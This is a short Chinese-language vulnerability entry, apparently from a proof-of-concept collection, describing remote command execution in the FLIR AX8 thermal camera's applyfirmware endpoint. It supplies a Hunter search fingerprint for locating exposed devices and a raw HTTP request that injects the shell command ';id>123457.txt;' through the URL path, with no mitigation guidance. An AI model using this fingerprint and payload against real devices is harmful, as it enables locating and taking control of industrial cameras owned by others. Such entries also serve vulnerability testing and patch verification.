# FLIR-AX8热成像仪applyfirmware存在远程命令执行漏洞

FLIR-AX8热成像仪applyfirmware存在远程命令执行漏洞，允许攻击者在目标服务器上执行任意系统命令，可能导致服务器被完全控制、数据泄露或破坏，严重威胁系统安全。

## hunter

```javascript
web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
```

## poc

```javascript
GET /settings/applyfirmware/;id>123457.txt;/false HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ******
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

